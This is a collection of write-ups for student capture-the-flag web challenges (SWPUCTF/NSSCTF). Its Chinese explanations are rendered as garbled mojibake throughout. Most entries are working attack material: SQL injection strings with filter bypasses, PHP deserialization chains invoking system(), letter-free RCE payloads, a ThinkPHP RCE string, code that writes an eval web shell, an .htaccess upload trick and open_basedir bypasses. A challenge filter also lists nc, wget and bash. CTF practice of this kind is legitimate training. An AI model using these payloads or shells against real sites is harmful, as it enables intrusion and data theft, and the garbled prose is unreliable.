çœ‹åˆ°è¿™ç§file_get_contentsçš„ç”¨æ³•ï¼Œå°±æ˜¯php://inputï¼Œå½“ç„¶dataåè®®ä¹Ÿå¯ [SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload3.0 å¯ä»¥çœ‹åˆ°å…è®¸htaccessä¸Šä¼  [SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce &lt;?php header(\"Content-Type:text/html;charset=utf-8\"); error_reporting(0); highlight_file(__FILE__); if(isset($_GET['wllm'])) { $wllm = $_GET['wllm']; $blacklist = [' ','\\t','\\r',' ','\\+','\\[','\\^','\\]','\\\"','\\-','\\$','\\*','\\?','\\&lt;','\\&gt;','\\=','\\`',]; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $wllm)) { die(\"LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼\"); }} if(preg_match('/[a-zA-Z]/is',$wllm)) { die(\"Ra's Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼\"); } echo \"NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ\"; eval($wllm); } else { echo \"è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼\"; } ?&gt; è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼ å¯ä»¥çœ‹åˆ°å­—æ¯å’Œå¤§éƒ¨åˆ†ç¬¦å·éƒ½è¿‡æ»¤äº†ï¼Œåªèƒ½æ— å­—æ¯RCEã€‚å¯å‚è€ƒï¼š æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ€»ç»“ï¼ˆå«ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ã€å¼‚æˆ–ã€æˆ–ã€å–åã€è‡ªå¢è„šæœ¬ï¼‰ &lt;?php //åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ /*author yu22x*/ fwrite(STDOUT,'[+]your function: '); $system=str_replace(array(\"\\r \", \"\\r\", \" \"), \"\", fgets(STDIN)); fwrite(STDOUT,'[+]your command: '); $command=str_replace(array(\"\\r \", \"\\r\", \" \"), \"\", fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');'; ?&gt; [SWPUCTF 2021 æ–°ç”Ÿèµ›]error ç®€å•çš„æŠ¥é”™æ³¨å…¥ ?id=1' and updatexml(1,concat(0x7e,substr((select flag from test_tb),15,30)),1)--+ [SWPUCTF 2021 æ–°ç”Ÿèµ›]pop &lt;?php error_reporting(0); show_source(\"index.php\"); class w44m{ private $admin = 'aaa'; protected $passwd = '123456'; public function Getflag(){ if($this-&gt;admin === 'w44m' &amp;&amp; $this-&gt;passwd ==='08067'){ include('flag.php'); echo $flag; }else{ echo $this-&gt;admin; echo $this-&gt;passwd; echo 'nono'; } } } class w22m{ public $w00m; public function __destruct(){ echo $this-&gt;w00m; } } class w33m{ public $w00m; public $w22m; public function __toString(){ $this-&gt;w00m-&gt;{$this-&gt;w22m}(); return 0; } } $w00m = $_GET['w00m']; unserialize($w00m); ?&gt; &lt;?php class w44m{ private $admin = 'w44m'; protected $passwd = '08067'; } class w22m{ public $w00m; } class w33m{ public $w00m; public $w22m; } $pop = new w22m(); $pop-&gt;w00m = new w33m(); $pop-&gt;w00m-&gt;w00m = new w44m(); $pop-&gt;w00m-&gt;w22m = 'Getflag'; echo urlencode(serialize($pop)); ?&gt; æ³¨æ„ä¸å¯è§å­—ç¬¦çš„å¤„ç†å³å¯ [SWPUCTF 2021 æ–°ç”Ÿèµ›]sql è¿™é“é¢˜è¿‡æ»¤äº†å‡ ä¸ªå…³é”®å­— ç©ºæ ¼ç”¨/**/ä»£æ›¿ =ç”¨likeä»£æ›¿ --+ä¸­çš„+ç”¨%23ä»£æ›¿ substrç”¨midä»£æ›¿ wllm=-1'/**/union/**/select/**/1,mid((concat(flag)),25,35),3/**/from/**/LTLT_flag%23 [SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce &lt;?php highlight_file(__FILE__); if(isset($_GET['url'])) { $url=$_GET['url']; if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\\"|\\&gt;|\\&lt;|\\%|\\$/i',$url)) { echo \"Sorry,you can't use this.\"; } else { echo \"Can you see anything?\"; exec($url); } } ç”±äºexecå‡½æ•°ï¼Œé‚£ä¹ˆæ˜¯æ— å›æ˜¾çš„ï¼Œè¿™é‡Œå¯ä»¥ç”¨teeå‘½ä»¤å°†å†…å®¹é‡å®šå‘åˆ°æ–‡ä»¶ï¼ŒéšåæŸ¥çœ‹æ–‡ä»¶å³å¯ l\\s /|tee 1.txt ?url=tac /flllll\\aaaaaaggggggg |tee 3.txt [SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_ez_php &lt;?php error_reporting(0); if (isset($_GET['file'])) { if ( substr($_GET[\"file\"], 0, 3) === \"php\" ) { echo \"Nice!!!\"; include($_GET[\"file\"]); } else { echo \"Hacker!!\"; } }else { highlight_file(__FILE__); } //flag.php æ ¹æ®ä»£ç ï¼Œå¾ˆæ˜æ˜¾è¦æ±‚æˆ‘ä»¬ç”¨PHPä¼ªåè®®ï¼ˆè¿™ä¹ˆæ˜æ˜¾ï¼Ÿï¼Ÿï¼‰ ç„¶åæç¤ºflagåœ¨flagæ–‡ä»¶ä¸­ [SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_ez_php(revenge) &lt;?php error_reporting(0); if (isset($_GET['file'])) { if ( substr($_GET[\"file\"], 0, 3) === \"php\" ) { echo \"Nice!!!\"; include($_GET[\"file\"]); } else { echo \"Hacker!!\"; } }else { highlight_file(__FILE__); } //flag.php ä¸ç†è§£ï¼Œä¸€æ¨¡ä¸€æ ·ï¼Œåªä¸è¿‡flagæ¢åœ°æ–¹äº†ã€‚ã€‚ã€‚ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ [SWPUCTF 2022 æ–°ç”Ÿèµ›]å¥‡å¦™çš„MD5 è¿™é“é¢˜å¬è„‘æ´ï¼Œä¸ä¼š-ã€‹çœ‹wp é¦–å…ˆæ˜¯ä¿¡æ¯æœé›†ï¼Œå‘ç°httpå¤´æœ‰æç¤º ä¹Ÿå°±æ˜¯è¯´å¤§æ¦‚ç‡ä¼ ä¸€ä¸ªå­—ç¬¦ï¼Œç»è¿‡md5($pass, true)å¤„ç†ä¹‹åä¸å‰é¢çš„SQLè¯­å¥æ‹¼æ¥ä¹‹åæ’ä¸ºtrue è¿™é‡Œæˆ‘æƒ³ä¸å‡ºæ¥ï¼Œçœ‹äº†wpå‘ç°æœ‰ä¸¤ç§å¯èƒ½ ä¸€ä¸ªç®—æ˜¯ä¸‡èƒ½ç»•è¿‡çš„å­—ç¬¦ï¼šffifdyopï¼Œæ ¹æ®å‡½æ•°md5åŠ å¯†åï¼Œå†æ¬¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œä¼šå˜æˆâ€™orâ€™6ï¼Œæ­¤æ—¶å‡½æ•°ä¸€å®šä¸ºçœŸã€‚ï¼ˆå…·ä½“å†…å®¹å¯ä»¥æŸ¥ä¸€æŸ¥md5($pass,true)å‡½æ•°ï¼‰ ä¸€ä¸ªæ˜¯ MD5 åŠ å¯†åå¼±æ¯”è¾ƒç­‰äºè‡ªèº«ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯ 0e215962017 md5($pass, true) çš„å«ä¹‰æ˜¯å¯¹ $pass è¿›è¡Œ MD5 å“ˆå¸Œè®¡ç®—ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸º trueï¼Œè¡¨ç¤ºè¿”å›äºŒè¿›åˆ¶ç»“æœï¼Œè€Œä¸æ˜¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒMD5 å“ˆå¸Œå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ª32ä¸ªå­—ç¬¦çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤ºçš„å“ˆå¸Œå€¼ï¼Œä½†å¦‚æœä¼ å…¥ true å‚æ•°ï¼Œåˆ™è¿”å›ä¸€ä¸ª16å­—èŠ‚çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ è¾“å…¥ä¸Šè¿°çš„å­—ç¬¦ä¸²ffifdyopä¹‹åï¼Œåˆ°äº†ç¬¬äºŒä¸ªé¡µé¢ï¼Œæ‰¾åˆ°éƒ¨åˆ†æºç  &lt;!-- $x= $GET['x']; $y = $_GET['y']; if($x != $y &amp;&amp; md5($x) == md5($y)){ ; -&gt; æ•°ç»„ç»•è¿‡ï¼Œä¹‹ååˆ°ç¬¬ä¸‰ä¸ªé¡µé¢ï¼Œä¾æ—§æ˜¯æ•°ç»„ç»•è¿‡ &lt;?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['wqh']!==$_POST['dsy']&amp;&amp;md5($_POST['wqh'])===md5($_POST['dsy'])){ echo $FLAG; } [SWPUCTF 2022 æ–°ç”Ÿèµ›]1z_unserialize &lt;?php class lyh{ public $url = 'NSSCTF.com'; public $lt; public $lly; function __destruct() { $a = $this-&gt;lt; $a($this-&gt;lly); } } unserialize($_POST['nss']); highlight_file(__FILE__); ?&gt; ç®€å•çš„ååºåˆ—åŒ– &lt;?php class lyh{ public $url; public $lt = 'system'; public $lly = 'cat${IFS}/flag'; function __destruct() { $a = $this-&gt;lt; $a($this-&gt;lly); } } $pop = new lyh(); echo serialize($pop); ?&gt; //O:3:\"lyh\":3:{s:3:\"url\";N;s:2:\"lt\";s:6:\"system\";s:3:\"lly\";s:14:\"cat${IFS}/flag\";} [SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_rce ç›´æ¥robots.txtæ‰¾åˆ°å¯¹åº”è·¯ç”±ï¼Œè®¿é—®ä¹‹åå‘ç°æ˜¯thinkphpæ¼æ´ï¼Œç›´æ¥payloadæ‰“å°±è¡Œäº† ?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /nss/ctf/flag/flag [SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_ez_unserialize &lt;?php class X { public $x = __FILE__; function __construct($x) { $this-&gt;x = $x; } function __wakeup() { if ($this-&gt;x !== __FILE__) { $this-&gt;x = __FILE__; } } function __destruct() { highlight_file($this-&gt;x); //flag is in fllllllag.php } } if (isset($_REQUEST['x'])) { @unserialize($_REQUEST['x']); } else { highlight_file(__FILE__); } ç®€å•çš„é“¾å­ï¼Œç»•è¿‡wakeupå³å¯ &lt;?php class X { public $x = 'fllllllag.php'; } $pop = new X(); echo serialize($pop); ?&gt; //O:1:\"X\":1:{s:1:\"x\";s:13:\"fllllllag.php\";} // æ”¹ä¸º //O:1:\"X\":3:{s:1:\"x\";s:13:\"fllllllag.php\";} [SWPUCTF 2022 æ–°ç”Ÿèµ›]where_am_i è¿™é“é¢˜æ²¡æƒ³åˆ°æ˜¯ç¤¾å·¥å­¦ï¼Œè™½ç„¶çŸ¥é“11ä½å¤§æ¦‚ç‡æ˜¯ç”µè¯å·ã€‚ã€‚ã€‚è¿™é‡Œæ˜¨æ™šæ‰ååº”è¿‡æ¥ï¼Œé¢˜ç›®ä¹Ÿæç¤ºè¿‡ï¼ˆæˆ‘åœ¨å“ªï¼‰ æ ¹æ®wpï¼Œè¿™é‡Œæœ‰å›¾ç‰‡åœ°å€ï¼Œç›´æ¥ç™¾åº¦è¯†å›¾çœ‹çœ‹ å‘ç°æ˜¯æˆéƒ½å±±æ°´é—´ å¤è¿¹é…’åº—ï¼Œç›´æ¥ç™¾åº¦æœä¸€æ‰‹ [SWPUCTF 2022 æ–°ç”Ÿèµ›]js_sign åˆæ˜¯ä¸€ä¸ªæ–°çŸ¥è¯†ï¼Œæ•²å‡»ç ï¼šé€šä¿¡é¢†åŸŸå¸¸ç”¨ç¼–ç  ï¼Œçœ‹äº†ä¸€ä¸‹æ„Ÿè§‰æŒºç®€å•ï¼Œå°±æ˜¯å¯¹å·å…¥åº§ï¼Œæ¥ä¸‹æ¥çœ‹æºç  è§£ç å¾—åˆ°ï¼štapcodeä¹Ÿå°±æ˜¯tap codeï¼šæ•²å‡»ç ï¼Œå¯¹åº”å·¥å…·ä¸ºï¼šhttp://www.hiencode.com/tapcode.html æ¥ç€å°†flagçš„å€¼ï¼Œä¸­é—´ç©ºæ ¼å»æ‰ï¼Œæ”¾è¿›å»è§£å¯†å³å¯ï¼šNSSCTF{youfindflagbytapcode} [SWPUCTF 2022 æ–°ç”Ÿèµ›]xff ä¿®æ”¹xffä»¥åŠrefererå¤´å³å¯ [SWPUCTF 2022 æ–°ç”Ÿèµ›]numgame å‘ç°æŸ¥çœ‹æºç ã€F12ä»€ä¹ˆçš„éƒ½ç¦äº†ï¼Œç›´æ¥ä¸ŠbpæŠ“ä¸€ä¸‹ å‘ç°å¤šä¸ªå¯ä»¥jsæ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹ï¼Œä»¥ä¸ºæ˜¯flagï¼Œè§£ç çœ‹çœ‹ï¼šNsScTf.php è®¿é—®é¡µé¢ &lt;?php error_reporting(0); //hint: ä¸getç›¸ä¼¼çš„å¦ä¸€ç§è¯·æ±‚åè®®æ˜¯ä»€ä¹ˆå‘¢ include(\"flag.php\"); class nss{ static function ctf(){ include(\"./hint2.php\"); } } if(isset($_GET['p'])){ if (preg_match(\"/n|c/m\",$_GET['p'], $matches)) die(\"no\"); call_user_func($_GET['p']); }else{ highlight_file(__FILE__); } è¿™é“é¢˜æ„Ÿè§‰æœ‰ç‚¹è„‘æ´äº†ï¼Œæˆ‘æƒ³ä¸åˆ°ã€‚ã€‚ã€‚è¿™é‡Œç¬¬äºŒä¸ªæç¤ºä¸ºï¼šæœ‰æ²¡æœ‰å¯èƒ½ç±»æ˜¯nss2å‘¢ã€‚ è¿™é‡Œé‡ç‚¹å‡½æ•°è‚¯å®šæ˜¯call_user_funcäº†ï¼Œæœä¸€ä¸‹ç”¨æ³• å½“ç„¶ä¹Ÿå¯ä»¥çœ‹è¿™ä¸ª ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°è°ƒç”¨æŸäº›æ–¹æ³•ï¼Œç»“åˆä»–è¯´çœŸæ­£çš„ç±»æ˜¯nss2ï¼Œè€Œnssç±»ä¸­æœ‰ä¸€ä¸ªctfæ–¹æ³•ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°è¯• nss2::ctfï¼Œå½“ç„¶å†ç»“åˆç¬¬ä¸€ä¸ªæç¤ºè¯´ï¼šä¸getç±»ä¼¼çš„ä¼ å‚æ–¹å¼æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè‚¯å®šæ˜¯postäº†ï¼Œè¯´æ˜éœ€è¦postä¼ å‚p æœ€åæŸ¥çœ‹æºç å³å¯ [SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_sql åˆšå¼€å§‹è¯´è®©æˆ‘ä»¬ç”¨ç›¸å¯¹å®‰å…¨çš„ä¼ å‚æ–¹å¼ï¼šè‚¯å®šæ˜¯postï¼Œæ¥ç€æˆ‘ç»™nsséšä¾¿ä¼ äº†ä¸ªå†…å®¹ï¼Œå‘ç°ä¸¤ä¸ªfake flagã€‚ã€‚ã€‚ã€‚ æ¥ç€å°±æ˜¯å¸¸è§„SQLæ‰‹å·¥æ³¨å…¥äº†ï¼Œè¿™é‡Œä¸æ–­fuzzå‘ç°è¿‡æ»¤äº†orderã€unionã€ç©ºæ ¼ï¼Œä¸è¿‡éƒ½å¯ä»¥åŒå†™ç»•è¿‡ï¼Œåé¢çš„ç”¨å†…è”æ³¨é‡Šç»•è¿‡å³å¯ nss=2'/**/uunionnion/**/select/**/1,database(),3# nss=2'/**/uunionnion/**/select/**/1,group_concat(table_name),3/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='NSS_db'# nss=2'/**/uunionnion/**/select/**/1,group_concat(column_name),3/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'# nss=2'/**/uunionnion/**/select/**/1,group_concat(Secr3t),3/**/from/**/NSS_tb# [SWPUCTF 2022 æ–°ç”Ÿèµ›]webdog1__start çœ‹åˆ°æºç æœ‰è¿™ä¸€å¤„åœ°æ–¹ï¼Œè¦æ±‚md5åŠ å¯†åç­‰äºè‡ªèº«ï¼Œé‚£æ‰¾ä¸€ä¸ª0eå¼€å¤´çš„å­—ç¬¦ä¸²å³å¯ï¼š?web=0e215962017 æ¥ç€ç»§ç»­çœ‹æºç ï¼Œç®­å¤´å¤„å¯ä»¥è”æƒ³åˆ°robots.txt ç»§ç»­è®¿é—®ï¼Œçœ‹åˆ°å“åº”åŒ…çš„æç¤ºï¼Œç»§ç»­è®¿é—® &lt;?php error_reporting(0); highlight_file(__FILE__); if (isset($_GET['get'])){ $get=$_GET['get']; if(!strstr($get,\" \")){ $get = str_ireplace(\"flag\", \" \", $get); if (strlen($get)&gt;18){ die(\"This is too long.\"); } else{ eval($get); } }else { die(\"nonono\"); } } ?&gt; ?get=eval($_POST[a]); //post a=system('cat /flag'); //ä¹Ÿå¯ä»¥ç›´æ¥ system(\"nl%09/*\"); [SWPUCTF 2022 æ–°ç”Ÿèµ›]funny_php &lt;?php session_start(); highlight_file(__FILE__); if(isset($_GET['num'])){ if(strlen($_GET['num'])&lt;=3&amp;&amp;$_GET['num']&gt;999999999){ echo \":D\"; $_SESSION['L1'] = 1; }else{ echo \":C\"; } } if(isset($_GET['str'])){ $str = preg_replace('/NSSCTF/',\"\",$_GET['str']); if($str === \"NSSCTF\"){ echo \"wow\"; $_SESSION['L2'] = 1; }else{ echo $str; } } if(isset($_POST['md5_1'])&amp;&amp;isset($_POST['md5_2'])){ if($_POST['md5_1']!==$_POST['md5_2']&amp;&amp;md5($_POST['md5_1'])==md5($_POST['md5_2'])){ echo \"Nice!\"; if(isset($_POST['md5_1'])&amp;&amp;isset($_POST['md5_2'])){ if(is_string($_POST['md5_1'])&amp;&amp;is_string($_POST['md5_2'])){ echo \"yoxi!\"; $_SESSION['L3'] = 1; }else{ echo \"X(\"; } } }else{ echo \"G\"; echo $_POST['md5_1'].\" \".$_POST['md5_2']; } } if(isset($_SESSION['L1'])&amp;&amp;isset($_SESSION['L2'])&amp;&amp;isset($_SESSION['L3'])){ include('flag.php'); echo $flag; } ?&gt; ç¬¬ä¸€ä¸ªæŒ‡æ•°ç»•è¿‡ã€ç¬¬äºŒä¸ªåŒå†™ç»•è¿‡ã€ç¬¬ä¸‰ä¸ªæ‰¾å­—ç¬¦ä¸²åœ¨md5åŠ å¯†å0eå¼€å¤´çš„å³å¯ ?num=9e9&amp;str=NSSNSSCTFCTF md5_1=s878926199a&amp;md5_2=s155964671a [SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce_3 &lt;?php header(\"Content-Type:text/html;charset=utf-8\"); error_reporting(0); highlight_file(__FILE__); if(isset($_GET['wllm'])) { $wllm = $_GET['wllm']; $blacklist = [' ','\\^','\\~','\\|']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $wllm)) { die(\"å°ä¼™å­åªä¼šå¼‚æˆ–å’Œå–åï¼Ÿä¸å¥½æ„æ€å“¦LTLTè¯´ä¸èƒ½ç”¨ï¼ï¼\"); }} if(preg_match('/[a-zA-Z0-9]/is',$wllm)) { die(\"Ra'sAlGhulè¯´ç”¨å­—æ¯æ•°å­—æ˜¯æ²¡æœ‰çµé­‚çš„ï¼\"); } echo \"NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ\"; eval($wllm); } else { echo \"è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼\"; } ?&gt; NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ è¿™é‡Œå§å–åã€å¼‚æˆ–éƒ½è¿‡æ»¤äº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨è‡ªå¢ï¼Œå›ºå®šæ ¼å¼å¦‚ä¸‹ï¼š $_=[];$_=@\"$_\";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); è¿™æ˜¯å›ºå®šæ ¼å¼æ„é€ å‡ºæ¥çš„ assert($_POST[_]); ç„¶åpostä¼ å…¥ _=phpinfo(); ä½¿ç”¨æ—¶éœ€è¦urlç¼–ç . å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä½†æ²¡æœ‰è¿‡æ»¤file_put_contentså‡½æ•°ï¼Œæˆ‘ä»¬ç›´æ¥å†™é©¬å³å¯ _=file_put_contents('shell.php','&lt;?php @eval($_POST[1]);?&gt;'); ä¹‹åèšå‰‘è¿æ¥ï¼ˆè¿™é‡Œå¼€å§‹ä¸€ç›´æŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºä½•ï¼Œä¹Ÿä¸æ˜¯ä»£ç†å•¥çš„é—®é¢˜ï¼Œç»“æœç­‰äº†ä¸€ä¼šå„¿çªç„¶åˆè¡Œäº†ï¼‰ ä¸è¿‡è¿™é‡Œä¹Ÿå¯ä»¥ç”¨å…¶ä»–åŠæ³•ï¼Œä½†å¦‚æœä¸æ˜¯ä¸Šè¿°ä»¤å†™é©¬çš„æ–¹å¼ï¼Œåˆ™éœ€è¦ç»•è¿‡disable_funtionsé™åˆ¶ ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢çš„ç»•è¿‡open_basedirçš„æ–¹æ³• &lt;?php mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));?&gt; //åˆ—ä¸¾æ ¹ç›®å½• &lt;?php mkdir('test'); chdir('test'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo file_get_contents('/flag');?&gt;//æ‹¿åˆ°flag [SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_1zpop &lt;?php error_reporting(0); class dxg { function fmm() { return \"nonono\"; } } class lt { public $impo='hi'; public $md51='weclome'; public $md52='to NSS'; function __construct() { $this-&gt;impo = new dxg; } function __wakeup() { $this-&gt;impo = new dxg; return $this-&gt;impo-&gt;fmm(); } function __toString() { if (isset($this-&gt;impo) &amp;&amp; md5($this-&gt;md51) == md5($this-&gt;md52) &amp;&amp; $this-&gt;md51 != $this-&gt;md52) return $this-&gt;impo-&gt;fmm(); } function __destruct() { echo $this; } } class fin { public $a; public $url = 'https://www.ctfer.vip'; public $title; function fmm() { $b = $this-&gt;a; $b($this-&gt;title); } } if (isset($_GET['NSS'])) { $Data = unserialize($_GET['NSS']); } else { highlight_file(__file__); } ç®€å•çš„é“¾å­ &lt;?php class dxg { } class lt { public $impo; public $md51; public $md52; } class fin { public $a; public $url; public $title; } $pop = new lt(); $pop-&gt;impo = new fin(); $pop-&gt;md51 = 'QNKCDZO'; $pop-&gt;md52 = '240610708'; $pop-&gt;impo-&gt;a = 'system'; $pop-&gt;impo-&gt;title = 'ls /'; echo serialize($pop); ?&gt; [SWPUCTF 2022 æ–°ç”Ÿèµ›]funny_web è¿™é‡Œæç¤ºè´¦æˆ·æ˜¯å®éªŒå®¤åå­—ï¼šNSSï¼Œå¯†ç æ˜¯ç¾¤é‡ŒæŸä½æˆå‘˜çš„QQï¼Œç®¡ç†å‘˜å…¨å°è¯•ä¸€æ¬¡å°±è¡Œäº†ï¼š2122693401 &lt;?php error_reporting(0); header(\"Content-Type: text/html;charset=utf-8\"); highlight_file(__FILE__); include('flag.php'); if (isset($_GET['num'])) { $num = $_GET['num']; if ($num != '12345') { if (intval($num) == '12345') { echo $FLAG; } } else { echo \"è¿™ä¸ºä½•ç›¸ç­‰åˆä¸ç›¸ç­‰\"; } } ç®€å•çš„PHPç‰¹æ€§ï¼Œå¯ä»¥æ¢è¿›åˆ¶ç»•è¿‡ã€å°æ•°ç‚¹ã€æ•°å­¦è®¡ç®—æ³•ã€äºŒæ¬¡å–åç­‰ç­‰ï¼š12345a [SWPUCTF 2022 æ–°ç”Ÿèµ›]Ez_upload æ–‡ä»¶ä¸Šä¼ ï¼Œè¿™é‡Œæ˜¯è¿‡æ»¤äº†phpåç¼€çš„phï¼Œé‚£ç•¸å½¢åç¼€åç»•è¿‡å°±åˆ«æƒ³äº†ã€‚ä¹‹åä¸Šä¼ æ­£å¸¸çš„jpgå‘ç°è¿˜æ˜¯ä¸å¯¹ï¼Œå°±å°´å°¬äº†ï¼Œæˆ‘å¯»æ€éƒ½å¾ˆæ­£å¸¸ï¼Œçœ‹äº†wpå‘ç°ï¼Œé‚£ä¸ªæç¤ºå°±æ˜¯å•çº¯çš„æ£€æµ‹æ–‡ä»¶å†…å®¹è€Œå·²ã€‚æå¾—æˆ‘æœ‰ç‚¹æ™• è¿™é‡Œçš„å…¶ä»–ç±»å‹æˆ‘ä»¥ä¸ºå°±æ˜¯mimeçš„ç±»å‹ä¸å¯¹æˆ–è€…æ˜¯åç¼€è¢«è¿‡æ»¤äº†ã€‚ä¹Ÿåæ˜ å‡ºæ¥åˆ†ææ–‡ä»¶ä¸Šä¼ çš„æ€è·¯å°±ä¸è¡Œï¼Œä¸”ä¸Šä¼ æ­£å¸¸jpgå°±åº”è¯¥æ³¨æ„å†…å®¹çš„æ­£å¸¸ä¸å¦ï¼Œéœ€è¦ä¸€æ­¥æ­¥æ’é™¤ï¼Œä¸è®©å°±å¦‚åŒæˆ‘ä¸€æ ·ï¼Œä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆ è¿™é‡Œæ›´æ¢æ­£å¸¸å†…å®¹ï¼Œå°±æˆåŠŸä¸Šä¼ ï¼Œæ˜¾ç„¶å°±æ˜¯åˆ©ç”¨.htaccessæ–‡ä»¶äº†ï¼Œä½†åˆé™åˆ¶æ–‡ä»¶å†…å®¹ï¼Œç¿»ä¸€ä¸‹ç¬”è®° æ­£å¥½ï¼Œé‚£ç›´æ¥ä¸Šå°±å¯¹äº† AddType application/x-httpd-php .bcx å…ˆæˆåŠŸè®©å…¶è§£æbcxæ–‡ä»¶ï¼Œæ¥ç€ä¸Šä¼  &lt;script language=\"php\"&gt;eval($_POST[1]);&lt;/script&gt; ä¸Šä¼ åï¼Œå‘ç°flagåœ¨envä¸­ [SWPUCTF 2023 ç§‹å­£æ–°ç”Ÿèµ›]If_else æŸä¸€å¤©,NSSCTFç»™äº†ä½ ä¸€æ¬¡æœºä¼š,è®©ä½ æ¥è‡ªå®šä¹‰ifä¸­çš„æ¡ä»¶,æäº¤åè®¿é—®check.phpæŸ¥çœ‹ç»“æœ æäº¤æ–¹å¼$_POST[\"check\"] è®°å¾—è®¿é—®ä¸€ä¸‹check.phpå“¦~ check.phpçš„å†…å®¹ &lt;?php $a=false; $b=false; if(ä½ æäº¤çš„éƒ¨åˆ†å°†ä¼šè¢«å†™è‡³è¿™é‡Œ) {$a=true;} else {$b=true;} if($a===true&amp;&amp;$b===true) eval(system(cat /flag)); ?&gt; è¿™é‡Œåˆ†æä¸€æ³¢å°±å¯ä»¥çŸ¥é“ï¼Œæ ¹æœ¬ä¸å¯èƒ½ç»•è¿‡ifè¯­å¥ï¼Œæˆ‘ä¹Ÿæ˜¯é™·è¯¯åŒºäº†ï¼Œå½“æ—¶è¿˜æƒ³ç€æ˜¯å¦å¯ä»¥é—­åˆæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ²¡æˆåŠŸï¼Œçœ‹äº†wpæ‰çŸ¥é“æˆ‘æ„é€ å°±é”™äº†ã€‚ä¸¤ç§æ–¹æ³•ï¼š 